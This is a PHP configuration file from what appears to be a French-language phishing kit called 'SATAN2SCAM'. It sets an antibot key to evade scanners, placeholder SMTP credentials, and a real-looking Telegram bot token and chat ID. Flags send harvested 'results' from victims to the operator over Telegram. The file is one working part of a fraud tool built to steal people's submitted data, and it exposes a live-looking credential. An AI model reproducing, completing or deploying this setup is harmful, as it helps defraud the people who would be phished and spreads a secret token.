<?php

/**
 * @link     : https://www.lesatan2scam.com/ 
 * @package  : SATAN2SCAM 
 * @author   : SATAN2-SCAM 
 * @telegram : @lesatan2scam
 * @couriel  : lesatan2scam@gmail.com
 * @version  : Mise à jour
 * @copyright: https://facebook.com/lesatan2scam
 */
    
    session_start();
    error_reporting(0);

    define("ANTIBOT_API", 'API_HERE'); /* ANTIBOT.PW API */
    define("CPANEL_MODE", 0); /* CPANEL MODE : 0 or 1 */
  

    define("TELEGRAM_TOKEN", '8442153175:AAHjjxc3z_tAzvvX87dZCu2d9Z6j1qaI2Ws'); /* Le token ou API key du bot Télégram */
    define("TELEGRAM_CHAT_ID", '5973787504'); /* L'identifiant de messagerie du Télégram */
    
    
    define("SMTP_HOSTNAME", 'smtp.host.com'); /* Serveur host du SMTP */
    define("SMTP_USER", 'username'); /* Username du SMTP */
    define("SMTP_PASS", 'password'); /* Password du SMTP */
    define("SMTP_PORT", 465); /* port du SMTP */
    define("SMTP_SSL", ''); /* SSL secure du SMTP : false or true or '' */
    define("SMTP_FROM_EMAIL", 'mail@from.me'); /* Email de l'expediteur du mail */
    define("SMTP_FROM_NAME", 'satan2'); /* Nom de l'expediteur du mail */
    define("RECEIVER_EMAIL", 'your@email.com'); /* Adresse de reception via le SMTP */


    define("RECEIVE_VIA_EMAIL", 0); /* Receive results via e-mail : 0 or 1 */
    define("RECEIVE_VIA_SMTP", 0); /* Receive results via smtp : 0 or 1 */
    define("RECEIVE_VIA_TELEGRAM", 1); /* Receive results via telegram : 0 or 1 */



    require_once 'detect.php';
    require_once 'functions.php';


   
?>